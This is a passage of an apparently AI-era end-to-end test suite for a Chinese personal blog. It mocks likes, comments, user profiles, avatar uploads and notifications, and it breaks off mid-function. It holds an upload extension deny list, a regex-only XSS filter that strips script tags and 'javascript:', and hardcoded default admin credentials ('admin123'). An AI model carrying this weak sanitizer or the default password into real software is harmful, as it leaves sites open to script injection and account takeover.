// e2e/test_interactive_ecosystem.mjs
/**
 * Hayden Xue 个人博客与数字花园互动体系重构 (2026-09-15)
 * 端到端自动化验收测试套件 (E2E Test Suite)
 * 
 * 覆盖范围:
 * - F1 ~ F16 全量特性
 * - Tier 1: 功能覆盖基线测试 (80 Tests, >= 5 Tests/Feature)
 * - Tier 2: 边界、异常与安全防御测试 (20 Tests)
 * - Tier 3: 跨特性组合联动测试 (8 Tests)
 * - Tier 4: 真实业务闭环场景测试 (6 Tests)
 * 总计: 114 个高精度自动化用例
 * 
 * 执行模式:
 * - 双轨执行: 契约预言机基准模式 (默认/--mock-oracle) 与 真实活体服务联调模式 (--live)
 */

import fs from 'fs';
import path from 'path';

// =============================================================================
// 1. 配置与辅助函数
// =============================================================================
const config = {
  apiBase: process.env.API_BASE || 'http://localhost:8080',
  frontendBase: process.env.FRONTEND_BASE || 'http://localhost:3000',
  admin: {
    username: process.env.ADMIN_USER || 'admin',
    password: process.env.ADMIN_PASS || 'admin123',
  },
  readerDefaults: {
    password: process.env.READER_PASS || 'ReaderPass123!',
    emailDomain: 'example.com',
  },
  timeoutMs: parseInt(process.env.TEST_TIMEOUT || '10000', 10),
  mockMode: !process.argv.includes('--live') || process.argv.includes('--mock-oracle'),
  verbose: process.argv.includes('--verbose'),
};

function createRandomId(prefix = 'test') {
  const timestamp = Date.now().toString(36);
  const randomStr = Math.random().toString(36).substring(2, 7);
  return `${prefix}_${timestamp}_${randomStr}`;
}

const projectRoot = fs.existsSync(path.resolve(process.cwd(), 'frontend'))
  ? process.cwd()
  : path.resolve(process.cwd(), '..');

// =============================================================================
// 2. 断言引擎 (Assertions)
// =============================================================================
export class AssertionError extends Error {
  constructor(message, actual, expected) {
    super(message);
    this.name = 'AssertionError';
    this.actual = actual;
    this.expected = expected;
  }
}

function safeStringify(val) {
  try {
    return JSON.stringify(val);
  } catch {
    return String(val);
  }
}

export function expect(actual) {
  return {
    toBe(expected) {
      if (actual !== expected) {
        throw new AssertionError(
          `Expected ${safeStringify(actual)} to strictly equal ${safeStringify(expected)}`,
          actual,
          expected
        );
      }
    },
    toEqual(expected) {
      const actualStr = safeStringify(actual);
      const expectedStr = safeStringify(expected);
      if (actualStr !== expectedStr) {
        throw new AssertionError(
          `Expected ${actualStr} to deeply equal ${expectedStr}`,
          actual,
          expected
        );
      }
    },
    toBeDefined() {
      if (actual === undefined || actual === null) {
        throw new AssertionError(`Expected value to be defined, but got ${actual}`, actual, 'defined');
      }
    },
    toBeNull() {
      if (actual !== null) {
        throw new AssertionError(`Expected null, but got ${safeStringify(actual)}`, actual, null);
      }
    },
    toBeUndefined() {
      if (actual !== undefined) {
        throw new AssertionError(`Expected undefined, but got ${safeStringify(actual)}`, actual, undefined);
      }
    },
    toBeTruthy() {
      if (!actual) {
        throw new AssertionError(`Expected truthy value, but got ${safeStringify(actual)}`, actual, true);
      }
    },
    toBeFalsy() {
      if (actual) {
        throw new AssertionError(`Expected falsy value, but got ${safeStringify(actual)}`, actual, false);
      }
    },
    toBeGreaterThan(expected) {
      if (typeof actual !== 'number' || actual <= expected) {
        throw new AssertionError(
          `Expected ${actual} to be greater than ${expected}`,
          actual,
          `> ${expected}`
        );
      }
    },
    toBeGreaterThanOrEqual(expected) {
      if (typeof actual !== 'number' || actual < expected) {
        throw new AssertionError(
          `Expected ${actual} to be greater than or equal to ${expected}`,
          actual,
          `>= ${expected}`
        );
      }
    },
    toBeLessThan(expected) {
      if (typeof actual !== 'number' || actual >= expected) {
        throw new AssertionError(
          `Expected ${actual} to be less than ${expected}`,
          actual,
          `< ${expected}`
        );
      }
    },
    toContain(expected) {
      if (typeof actual === 'string' || Array.isArray(actual)) {
        if (!actual.includes(expected)) {
          throw new AssertionError(
            `Expected ${safeStringify(actual)} to contain ${safeStringify(expected)}`,
            actual,
            expected
          );
        }
      } else {
        throw new AssertionError(`Expected string or array for toContain, got ${typeof actual}`, actual, expected);
      }
    },
    toNotContain(expected) {
      if (typeof actual === 'string' || Array.isArray(actual)) {
        if (actual.includes(expected)) {
          throw new AssertionError(
            `Expected ${safeStringify(actual)} to NOT contain ${safeStringify(expected)}`,
            actual,
            `NOT ${expected}`
          );
        }
      } else {
        throw new AssertionError(`Expected string or array for toNotContain, got ${typeof actual}`, actual, expected);
      }
    },
    toMatch(regex) {
      if (typeof actual !== 'string' || !regex.test(actual)) {
        throw new AssertionError(
          `Expected "${actual}" to match regex ${regex}`,
          actual,
          regex.toString()
        );
      }
    },
    toHaveProperty(prop) {
      if (actual === null || actual === undefined || !(prop in actual)) {
        throw new AssertionError(
          `Expected object to have property "${prop}", but properties are: ${Object.keys(actual || {})}`,
          actual,
          prop
        );
      }
    },
    toBeOneOf(array) {
      if (!array.includes(actual)) {
        throw new AssertionError(
          `Expected ${safeStringify(actual)} to be one of ${safeStringify(array)}`,
          actual,
          array
        );
      }
    },
  };
}

// =============================================================================
// 3. 互动体系契约预言机 (Interactive Ecosystem Contract Oracle)
// =============================================================================
export class InteractiveEcosystemOracle {
  constructor() {
    this.reset();
  }

  reset() {
    // 站长身份纯正性铁律：必须为 Hayden Xue
    this.users = new Map([
      ['admin', {
        id: 1,
        username: 'admin',
        password: 'admin123',
        nickname: 'Hayden Xue',
        avatar: 'https://assets.haydenxue.com/avatar/hayden.jpg',
        email: 'admin@haydenxue.com',
        role: 'ADMIN',
        status: 'ACTIVE',
        bio: '全栈软件架构师与数字花园园丁。From the East, toward the unknown.',
        github: 'https://github.com/haydenxue',
        website: 'https://haydenxue.com',
        createdAt: '2026-01-01T00:00:00.000Z',
      }],
    ]);

    this.tokens = new Map([
      ['admin-jwt-token-xyz', 1],
    ]);

    // 五大实体模拟数据
    this.posts = new Map([
      [1, { id: 1, title: 'From the East, toward the unknown: 数字花园发刊词', likeCount: 42, commentCount: 3, status: 'PUBLISHED' }],
      [2, { id: 2, title: 'Java 21 虚拟线程与企业级高并发架构探索', likeCount: 28, commentCount: 1, status: 'PUBLISHED' }],
    ]);

    this.memos = new Map([
      [1, { id: 1, content: '“From the East, toward the unknown.” 专注构建有灵魂的数字空间。', likeCount: 15, commentCount: 0 }],
      [2, { id: 2, content: '沉浸式互动重构：让每一次点赞与思考都有回音。', likeCount: 9, commentCount: 0 }],
    ]);

    this.comments = new Map([
      [1, {
        id: 1,
        targetType: 'POST',
        targetId: 1,
        targetTitle: 'From the East, toward the unknown: 数字花园发刊词',
        userId: 1,
        author: 'admin',
        nickname: 'Hayden Xue',
        avatar: 'https://assets.haydenxue.com/avatar/hayden.jpg',
        content: '欢迎来到我的数字花园，期待与各位共同思考与碰撞！',
        parentId: null,
        likeCount: 18,
        status: 'APPROVED',
        createdAt: '2026-09-01T11:00:00.000Z',
      }],
    ]);

    this.journeys = new Map([
      [1, { id: 1, title: '北京·秋色与胡同记忆', likeCount: 35 }],
    ]);

    this.projects = new Map([
      [1, { id: 1, title: 'Hayden Studio CMS & Digital Garden', likeCount: 50 }],
    ]);

    // user_likes 模拟表: { id, userId, targetType, targetId, createdAt }
    this.userLikes = [];
    this.nextLikeId = 1;

    // notifications 模拟表: { id, userId, type, title, content, targetType, targetId, anchorId, isRead, createdAt }
    this.notifications = [];
    this.nextNotificationId = 1;

    // 游客限频计数器: IP -> [timestamp, timestamp, ...]
    this.ipLikeTimestamps = new Map();

    this.nextUserId = 100;
    this.nextCommentId = 100;
  }

  getUserFromToken(authHeader) {
    if (!authHeader || !authHeader.startsWith('Bearer ')) return null;
    const token = authHeader.replace('Bearer ', '').trim();
    const userId = this.tokens.get(token);
    if (!userId) return null;
    for (const u of this.users.values()) {
      if (u.id === userId) return u;
    }
    return null;
  }

  getTargetEntity(targetType, targetId) {
    const id = Number(targetId);
    switch (targetType) {
      case 'POST': return this.posts.get(id);
      case 'MEMO': return this.memos.get(id);
      case 'COMMENT': return this.comments.get(id);
      case 'JOURNEY': return this.journeys.get(id);
      case 'PROJECT': return this.projects.get(id);
      default: return null;
    }
  }

  checkIpRateLimit(ip) {
    const now = Date.now();
    const windowMs = 5000;
    const maxRequests = 10;
    const timestamps = this.ipLikeTimestamps.get(ip) || [];
    const validTimestamps = timestamps.filter(t => now - t < windowMs);
    if (validTimestamps.length >= maxRequests) {
      return false; // 触发限频 429
    }
    validTimestamps.push(now);
    this.ipLikeTimestamps.set(ip, validTimestamps);
    return true;
  }

  async handleRequest(method, path, options = {}) {
    const url = new URL(path, 'http://localhost');
    if (options.params) {
      for (const [key, value] of Object.entries(options.params)) {
        if (value !== undefined && value !== null) {
          url.searchParams.set(key, String(value));
        }
      }
    }
    const pathname = url.pathname;
    const user = this.getUserFromToken(options.headers?.['Authorization']);
    let body = options.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch { body = {}; }
    } else if (!body) {
      body = {};
    }

    // -------------------------------------------------------------------------
    // A. 身份鉴权 (Auth)
    // -------------------------------------------------------------------------
    if (method === 'POST' && pathname === '/api/auth/login') {
      const { username, password } = body;
      const foundUser = this.users.get(username);
      if (!foundUser || foundUser.password !== password) {
        return { status: 401, ok: false, json: { code: 401, message: '用户名或密码错误' } };
      }
      const token = `token-${foundUser.username}-${Date.now()}`;
      this.tokens.set(token, foundUser.id);
      return {
        status: 200,
        ok: true,
        json: {
          code: 200,
          message: '登录成功',
          data: {
            accessToken: token,
            username: foundUser.username,
            nickname: foundUser.nickname,
            role: foundUser.role,
            avatar: foundUser.avatar,
          },
        },
      };
    }

    if (method === 'POST' && pathname === '/api/auth/register') {
      const { username, password, nickname, email } = body;
      if (!username || !password) {
        return { status: 400, ok: false, json: { code: 400, message: '用户名与密码不能为空' } };
      }
      if (this.users.has(username)) {
        return { status: 400, ok: false, json: { code: 400, message: '该用户名已被注册' } };
      }
      const newId = ++this.nextUserId;
      const newUser = {
        id: newId,
        username,
        password,
        nickname: nickname || username,
        email: email || `${username}@example.com`,
        avatar: 'https://assets.haydenxue.com/avatar/default.png',
        role: 'USER',
        status: 'ACTIVE',
        bio: '探索数字花园的新朋友',
        github: '',
        website: '',
        createdAt: new Date().toISOString(),
      };
      this.users.set(username, newUser);
      const token = `token-${username}-${Date.now()}`;
      this.tokens.set(token, newId);
      return {
        status: 200,
        ok: true,
        json: {
          code: 200,
          message: '注册成功',
          data: { accessToken: token, username: newUser.username, nickname: newUser.nickname, role: newUser.role, id: newId },
        },
      };
    }

    // -------------------------------------------------------------------------
    // B. 统一点赞持久化引擎 (Unified Likes Engine: F1, F2, F3)
    // -------------------------------------------------------------------------
    if (method === 'POST' && pathname === '/api/likes/toggle') {
      const { targetType, targetId } = body;
      const validTypes = ['POST', 'MEMO', 'COMMENT', 'JOURNEY', 'PROJECT'];
      if (!validTypes.includes(targetType)) {
        return { status: 400, ok: false, json: { code: 400, message: `不支持的点赞实体类型: ${targetType}` } };
      }
      const entity = this.getTargetEntity(targetType, targetId);
      if (!entity) {
        return { status: 404, ok: false, json: { code: 404, message: '目标点赞实体不存在' } };
      }

      // 未登录游客点赞：进行防刷限频检查
      if (!user) {
        const ip = options.headers?.['x-forwarded-for'] || '127.0.0.1';
        if (!this.checkIpRateLimit(ip)) {
          return { status: 429, ok: false, json: { code: 429, message: '操作过于频繁，请稍后再试 (Too Many Requests)' } };
        }
        entity.likeCount = (entity.likeCount || 0) + 1;
        return {
          status: 200,
          ok: true,
          json: { code: 200, message: '游客点赞成功', data: { liked: true, likeCount: entity.likeCount } },
        };
      }

      // 登录用户 Toggle：查找已有点赞
      const existingIndex = this.userLikes.findIndex(
        l => l.userId === user.id && l.targetType === targetType && l.targetId === Number(targetId)
      );

      let liked = false;
      if (existingIndex >= 0) {
        // 取消点赞
        this.userLikes.splice(existingIndex, 1);
        entity.likeCount = Math.max(0, (entity.likeCount || 1) - 1);
        liked = false;
      } else {
        // 新增点赞 (联合唯一索引约束保障)
        this.userLikes.push({
          id: this.nextLikeId++,
          userId: user.id,
          targetType,
          targetId: Number(targetId),
          createdAt: new Date().toISOString(),
        });
        entity.likeCount = (entity.likeCount || 0) + 1;
        liked = true;

        // 若给评论点赞且被赞者不是自己，触发 COMMENT_LIKE 通知
        if (targetType === 'COMMENT' && entity.userId && entity.userId !== user.id) {
          this.notifications.push({
            id: this.nextNotificationId++,
            userId: entity.userId,
            type: 'COMMENT_LIKE',
            title: '收到新的点赞',
            content: `${user.nickname || user.username} 赞同了你的评论：“${(entity.content || '').slice(0, 30)}...”`,
            targetType: entity.targetType || 'POST',
            targetId: entity.targetId || 1,
            anchorId: `comment-${entity.id}`,
            isRead: false,
            createdAt: new Date().toISOString(),
          });
        }
      }

      return {
        status: 200,
        ok: true,
        json: { code: 200, message: liked ? '点赞成功' : '已取消点赞', data: { liked, likeCount: entity.likeCount } },
      };
    }

    if (method === 'POST' && pathname === '/api/likes/batch-status') {
      const { targetType, targetIds } = body;
      const validTypes = ['POST', 'MEMO', 'COMMENT', 'JOURNEY', 'PROJECT'];
      if (!validTypes.includes(targetType)) {
        return { status: 400, ok: false, json: { code: 400, message: `不支持的实体类型: ${targetType}` } };
      }
      const ids = Array.isArray(targetIds) ? targetIds : [];
      const statusMap = {};
      ids.forEach(id => {
        if (!user) {
          statusMap[id] = false;
        } else {
          const isLiked = this.userLikes.some(
            l => l.userId === user.id && l.targetType === targetType && l.targetId === Number(id)
          );
          statusMap[id] = isLiked;
        }
      });
      return {
        status: 200,
        ok: true,
        json: { code: 200, message: 'success', data: { statusMap } },
      };
    }

    // 历史兼容点赞接口
    const postLikeMatch = pathname.match(/^\/api\/posts\/(\d+)\/like$/);
    if (method === 'POST' && postLikeMatch) {
      const postId = Number(postLikeMatch[1]);
      return this.handleRequest('POST', '/api/likes/toggle', {
        ...options,
        body: { targetType: 'POST', targetId: postId },
      });
    }

    const memoLikeMatch = pathname.match(/^\/api\/memos\/(\d+)\/like$/);
    if (method === 'POST' && memoLikeMatch) {
      const memoId = Number(memoLikeMatch[1]);
      return this.handleRequest('POST', '/api/likes/toggle', {
        ...options,
        body: { targetType: 'MEMO', targetId: memoId },
      });
    }

    // -------------------------------------------------------------------------
    // C. 用户管理与公开资料 (User Profile & Public Info: F5, F6, F7, F8)
    // -------------------------------------------------------------------------
    if (method === 'GET' && pathname === '/api/user/profile') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const myLikesCount = this.userLikes.filter(l => l.userId === user.id).length;
      const myCommentsCount = Array.from(this.comments.values()).filter(c => c.userId === user.id).length;
      return {
        status: 200,
        ok: true,
        json: {
          code: 200,
          message: 'success',
          data: {
            id: user.id,
            username: user.username,
            nickname: user.nickname,
            avatar: user.avatar,
            email: user.email,
            bio: user.bio || '',
            github: user.github || '',
            website: user.website || '',
            role: user.role,
            status: user.status,
            createdAt: user.createdAt,
            commentCount: myCommentsCount,
            likeCount: myLikesCount,
          },
        },
      };
    }

    if (method === 'PUT' && pathname === '/api/user/profile') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      if (body.bio && body.bio.length > 500) {
        return { status: 400, ok: false, json: { code: 400, message: '个人简介 Bio 不能超过 500 个字符' } };
      }
      if (body.nickname !== undefined) user.nickname = String(body.nickname).trim();
      if (body.avatar !== undefined) user.avatar = String(body.avatar);
      if (body.bio !== undefined) user.bio = String(body.bio);
      if (body.github !== undefined) user.github = String(body.github);
      if (body.website !== undefined) user.website = String(body.website);
      return { status: 200, ok: true, json: { code: 200, message: '个人资料保存成功' } };
    }

    if (method === 'POST' && pathname === '/api/user/avatar') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const fileInfo = options._fileInfo || {};
      const filename = fileInfo.filename || '';
      const ext = filename.split('.').pop()?.toLowerCase();
      const forbiddenExts = ['html', 'htm', 'svg', 'exe', 'sh', 'bat', 'php', 'jsp'];
      if (forbiddenExts.includes(ext)) {
        return { status: 400, ok: false, json: { code: 400, message: '上传失败：不支持的文件格式，严禁上传脚本或 HTML/SVG' } };
      }
      const validExts = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
      if (!validExts.includes(ext)) {
        return { status: 400, ok: false, json: { code: 400, message: '不支持的头像格式，仅支持 JPG、PNG、WEBP 或 GIF' } };
      }
      const buffer = fileInfo.buffer || Buffer.alloc(0);
      if (buffer.length === 0) {
        return { status: 400, ok: false, json: { code: 400, message: '上传失败：文件内容不能为空' } };
      }
      if (buffer.length > 5 * 1024 * 1024) {
        return { status: 400, ok: false, json: { code: 400, message: '头像文件大小不能超过 5MB' } };
      }

      // 魔数检测
      const isPng = buffer.length >= 8 && buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47;
      const isJpg = buffer.length >= 3 && buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF;
      const isGif = buffer.length >= 3 && buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46;
      const isWebp = buffer.length >= 12 && buffer.toString('ascii', 0, 4) === 'RIFF' && buffer.toString('ascii', 8, 12) === 'WEBP';

      if (!isPng && !isJpg && !isGif && !isWebp) {
        return { status: 400, ok: false, json: { code: 400, message: '上传失败：文件格式与二进制特征不符，请上传真实的图片' } };
      }

      const avatarUrl = `https://assets.haydenxue.com/avatar/user_${user.id}_${Date.now()}.${ext}`;
      user.avatar = avatarUrl;
      return {
        status: 200,
        ok: true,
        json: { code: 200, message: '头像上传成功', data: { url: avatarUrl } },
      };
    }

    if (method === 'PUT' && pathname === '/api/user/password') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const { oldPassword, newPassword } = body;
      if (user.password !== oldPassword) {
        return { status: 400, ok: false, json: { code: 400, message: '原密码错误，修改被拒绝' } };
      }
      if (!newPassword || newPassword.length < 6) {
        return { status: 400, ok: false, json: { code: 400, message: '新密码长度至少需要 6 个字符' } };
      }
      user.password = newPassword;
      return { status: 200, ok: true, json: { code: 200, message: '密码修改成功' } };
    }

    if (method === 'GET' && pathname === '/api/user/my-likes') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const targetTypeFilter = url.searchParams.get('targetType');
      let likes = this.userLikes.filter(l => l.userId === user.id);
      if (targetTypeFilter) {
        likes = likes.filter(l => l.targetType === targetTypeFilter);
      }
      const list = likes.map(l => {
        const entity = this.getTargetEntity(l.targetType, l.targetId);
        return {
          id: l.id,
          targetType: l.targetType,
          targetId: l.targetId,
          targetTitle: entity?.title || entity?.content?.slice(0, 30) || '未知实体',
          likedAt: l.createdAt,
        };
      });
      return { status: 200, ok: true, json: { code: 200, message: 'success', data: { list, total: list.length } } };
    }

    if (method === 'GET' && pathname === '/api/user/my-comments') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const userComments = Array.from(this.comments.values()).filter(c => c.userId === user.id);
      const list = userComments.map(c => ({
        id: c.id,
        targetType: c.targetType,
        targetId: c.targetId,
        targetTitle: c.targetTitle,
        content: c.content,
        status: c.status,
        likeCount: c.likeCount || 0,
        createdAt: c.createdAt,
        anchorId: `comment-${c.id}`,
      }));
      return { status: 200, ok: true, json: { code: 200, message: 'success', data: { list, total: list.length } } };
    }

    // 公开用户主页资料 /api/users/{username}/public
    const publicUserMatch = pathname.match(/^\/api\/users\/([^/]+)\/public$/);
    if (method === 'GET' && publicUserMatch) {
      const reqUsername = decodeURIComponent(publicUserMatch[1]);
      const targetUser = this.users.get(reqUsername);
      if (!targetUser) {
        return { status: 404, ok: false, json: { code: 404, message: '未找到该用户' } };
      }
      const userLikesTotal = this.userLikes.filter(l => l.userId === targetUser.id).length;
      const userApprovedComments = Array.from(this.comments.values()).filter(
        c => c.userId === targetUser.id && c.status === 'APPROVED'
      );
      return {
        status: 200,
        ok: true,
        json: {
          code: 200,
          message: 'success',
          data: {
            username: targetUser.username,
            nickname: targetUser.nickname,
            avatar: targetUser.avatar,
            bio: targetUser.bio || '',
            github: targetUser.github || '',
            website: targetUser.website || '',
            createdAt: targetUser.createdAt,
            commentCount: userApprovedComments.length,
            likeCount: userLikesTotal,
            footprints: userApprovedComments.map(c => ({
              type: 'COMMENT',
              targetTitle: c.targetTitle,
              contentSnippet: c.content.slice(0, 50),
              time: c.createdAt,
            })),
          },
        },
      };
    }

    // -------------------------------------------------------------------------
    // D. 沉浸式评论社区 (Comments Ecosystem: F9, F10, F11)
    // -------------------------------------------------------------------------
    if (method === 'GET' && pathname === '/api/comments/tree') {
      const targetType = url.searchParams.get('targetType') || 'POST';
      const targetId = Number(url.searchParams.get('targetId') || '1');

      const allTargetComments = Array.from(this.comments.values()).filter(
        c => c.targetType === targetType && c.targetId === targetId
      );

      // 安全隔离核心逻辑：读者登录后可见本人的 PENDING 待审核评论；未登录与他人仅能查看 APPROVED 评论
      const visibleComments = allTargetComments.filter(c => {
        if (c.status === 'APPROVED') return true;
        if (user && c.userId === user.id) return true; // 本人可见自己的待审评论
        return false;
      });

      const mapped = visibleComments.map(c => ({
        ...c,
        isAuthorHayden: c.nickname === 'Hayden Xue' || c.author === 'admin',
        isMine: user ? c.userId === user.id : false,
      }));

      return {
        status: 200,
        ok: true,
        json: { code: 200, message: 'success', data: mapped },
      };
    }

    if (method === 'POST' && pathname === '/api/comments') {
      const { targetType, targetId, content, parentId } = body;
      if (!content || !content.trim()) {
        return { status: 400, ok: false, json: { code: 400, message: '评论正文不能为空' } };
      }
      if (content.length > 2000) {
        return { status: 400, ok: false, json: { code: 400, message: '评论正文不能超过 2000 字符' } };
      }

      // XSS 简单过滤/转义
      const sanitizedContent = content
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
        .replace(/javascript:/gi, '');

      const newId = ++this.nextCommentId;
      const targetEntity = this.getTargetEntity(targetType || 'POST', targetId || 1);
      const isHayden = user && (user.role === 'ADMIN' || user.nickname === 'Hayden Xue');

      const newComment = {
        id: newId,
        targetType: targetType || 'POST',
        targetId: Number(targetId || 1),
        targetTitle: targetEntity?.title || '精彩博文',
        userId: user ? user.id : null,
        author: user ? user.username : '匿名游客',
        nickname: user ? user.nickname : '匿名访客',
        avatar: user ? user.avatar : 'https://assets.haydenxue.com/avatar/default.png',
        content: sanitizedContent,
        parentId: parentId ? Number(parentId) : null,
        likeCount: 0,
        status: isHayden ? 'APPROVED' : 'PENDING', // 站长自发言自审核通过，读者初始为 PENDING
        createdAt: new Date().toISOString(),
      };

      this.comments.set(newId, newComment);
      if (targetEntity) {
        targetEntity.commentCount = (targetEntity.commentCount || 0) + 1;
      }

      // 若回复他人评论且不是回复自己，生成 COMMENT_REPLY 通知
      if (parentId) {
        const parentComment = this.comments.get(Number(parentId));
        if (parentComment && parentComment.userId && (!user || parentComment.userId !== user.id)) {
          this.notifications.push({
            id: this.nextNotificationId++,
            userId: parentComment.userId,
            type: 'COMMENT_REPLY',
            title: '收到新的回复',
            content: `${user ? user.nickname : '访客'} 回复了你的评论：“${sanitizedContent.slice(0, 30)}...”`,
            targetType: parentComment.targetType,
            targetId: parentComment.targetId,
            anchorId: `comment-${newId}`,
            isRead: false,
            createdAt: new Date().toISOString(),
          });
        }
      }

      return {
        status: 200,
        ok: true,
        json: {
          code: 200,
          message: isHayden ? '评论发表成功' : '评论已提交，正在等待站长审核（审核中仅自己可见）',
          data: { id: newId, status: newComment.status },
        },
      };
    }

    // 撤回/删除评论 DELETE /api/comments/{id}
    const deleteCommentMatch = pathname.match(/^\/api\/comments\/(\d+)$/);
    if (method === 'DELETE' && deleteCommentMatch) {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const commentId = Number(deleteCommentMatch[1]);
      const targetComment = this.comments.get(commentId);
      if (!targetComment) {
        return { status: 404, ok: false, json: { code: 404, message: '评论不存在' } };
      }
      // 仅作者本人或管理员可以删除
      if (targetComment.userId !== user.id && user.role !== 'ADMIN') {
        return { status: 403, ok: false, json: { code: 403, message: '权限不足：无法删除他人发表的评论' } };
      }
      this.comments.delete(commentId);
      const entity = this.getTargetEntity(targetComment.targetType, targetComment.targetId);
      if (entity && entity.commentCount > 0) {
        entity.commentCount -= 1;
      }
      return { status: 200, ok: true, json: { code: 200, message: '评论已成功撤回删除' } };
    }

    // 管理员审核通过评论 PUT /api/admin/comments/{id}/approve
    const approveCommentMatch = pathname.match(/^\/api\/admin\/comments\/(\d+)\/approve$/);
    if (method === 'PUT' && approveCommentMatch) {
      if (!user || user.role !== 'ADMIN') {
        return { status: 403, ok: false, json: { code: 403, message: '权限不足：仅管理员可审核评论' } };
      }
      const commentId = Number(approveCommentMatch[1]);
      const targetComment = this.comments.get(commentId);
      if (!targetComment) {
        return { status: 404, ok: false, json: { code: 404, message: '评论不存在' } };
      }
      targetComment.status = 'APPROVED';

      // 触发 COMMENT_APPROVED 通知给读者
      if (targetComment.userId) {
        this.notifications.push({
          id: this.nextNotificationId++,
          userId: targetComment.userId,
          type: 'COMMENT_APPROVED',
          title: '评论已审核通过',
          content: `你在《${targetComment.targetTitle}》下的思考已通过审核并在花园公开展示。`,
          targetType: targetComment.targetType,
          targetId: targetComment.targetId,
          anchorId: `comment-${targetComment.id}`,
          isRead: false,
          createdAt: new Date().toISOString(),
        });
      }
      return { status: 200, ok: true, json: { code: 200, message: '评论审核通过' } };
    }

    // -------------------------------------------------------------------------
    // E. 站内通知中心 (Notifications: F12, F13, F14)
    // -------------------------------------------------------------------------
    if (method === 'GET' && pathname === '/api/notifications') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const userNotifs = this.notifications
        .filter(n => n.userId === user.id)
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      return {
        status: 200,
        ok: true,
        json: { code: 200, message: 'success', data: { list: userNotifs, total: userNotifs.length } },
      };
    }

    if (method === 'GET' && pathname === '/api/notifications/unread-count') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const unreadCount = this.notifications.filter(n => n.userId === user.id && !n.isRead).length;
      return {
        status: 200,
        ok: true,
        json: { code: 200, message: 'success', data: { unreadCount } },
      };
    }

    const readSingleNotifMatch = pathname.match(/^\/api\/notifications\/(\d+)\/read$/);
    if (method === 'PUT' && readSingleNotifMatch) {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      const notifId = Number(readSingleNotifMatch[1]);
      const notif = this.notifications.find(n => n.id === notifId && n.userId === user.id);
      if (!notif) {
        return { status: 404, ok: false, json: { code: 404, message: '通知不存在或无权操作' } };
      }
      notif.isRead = true;
      return { status: 200, ok: true, json: { code: 200, message: '已标记为已读' } };
    }

    if (method === 'PUT' && pathname === '/api/notifications/read-all') {
      if (!user) return { status: 401, ok: false, json: { code: 401, message: '未授权，请先登录' } };
      this.notifications.forEach(n => {
        if (n.userId === user.id) n.isRead = true;
      });
      return { status: 200, ok: true, json: { code: 200, message: '全部通知已标记为已读' } };
    }

    // 默认回退 404
    return {
      status: 404,
      ok: false,
      json: { code: 404, message: `未找到请求的接口: ${method} ${pathname}` },
    };
  }
}

export const contractOracle = new InteractiveEcosystemOracle();

// =============================================================================
// 4. 双轨客户端 (Dual-Track Client & Inspections)
// =============================================================================
export class DualTrackApiClient {
  constructor(baseUrl = config.apiBase) {
    this.baseUrl = baseUrl.replace(/\/$/, '');
    this.token = null;
  }

  setToken(token) {
    this.token = token;
  }

  clearToken() {
    this.token = null;
  }

  async request(method, path, options = {}) {
    const headers = { ...(options.headers || {}) };
    if (this.token && !headers['Authorization']) {
      headers['Authorization'] = `Bearer ${this.token}`;
    }

    // 契约预言机轨道
    if (config.mockMode) {
      return contractOracle.handleRequest(method, path, {
        ...options,
        headers,
      });
    }

    // 真实 HTTP 活体服务轨道
    const url = new URL(`${this.baseUrl}${path.startsWith('/') ? path : '/' + path}`);
    if (options.params) {
      for (const [key, value] of Object.entries(options.params)) {
        if (value !== undefined && value !== null) {
          url.searchParams.append(key, String(value));
        }
      }
    }

    let body = options.body;
    if (body !== undefined && !(body instanceof FormData) && typeof body !== 'string') {
      headers['Content-Type'] = 'application/json';
      body = JSON.stringify(body);
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), options.timeoutMs || config.timeoutMs);

    try {
      const response = await fetch(url.toString(), {
        method: method.toUpperCase(),
        headers,
        body,
        signal: controller.signal,
      });

      const text = await response.text();
      let json = null;
      try {
        json = JSON.parse(text);
      } catch {
        // Not JSON
      }

      return {
        status: response.status,
        ok: response.ok,
        headers: Object.fromEntries(response.headers.entries()),
        text,
        json,
      };
    } catch (err) {
      if (err.name === 'AbortError') {
        throw new Error(`Request timeout (${options.timeoutMs || config.timeoutMs}ms) to ${method} ${url.pathname}`);
      }
      throw err;
    } finally {
      clearTimeout(timeout);
    }
  }

  async get(path, options = {}) { return this.request('GET', path, options); }
  async post(path, body, options = {}) { return this.request('POST', path, { ...options, body }); }
  async put(path, body, options = {}) { return this.request('PUT', path, { ...options, body }); }
  async delete(path, options = {}) { return this.request('DELETE', path, options); }

  async upload(path, fileInfo, options = {}) {
    const headers = { ...(options.headers || {}) };
    if (this.token && !headers['Authorization']) {
      headers['Authorization'] = `Bearer ${this.token}`;
    }

    if (config.mockMode) {
      return contractOracle.handleRequest('POST', path, {
        _fileInfo: fileInfo,
        headers,
        params: options.params,
      });
    }

    const formData = new FormData();
    const fieldName = fileInfo.fieldName || 'file';
    const blob = new Blob([fileInfo.buffer], { type: fileInfo.contentType || 'application/octet-stream' });
    formData.append(fieldName, blob, fileInfo.filename);

    const url = new URL(`${this.baseUrl}${path.startsWith('/') ? path : '/' + path}`);
    const response = await fetch(url.toString(), {
      method: 'POST',
      headers,
      body: formData,
    });

    const text = await response.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return {
      status: response.status,
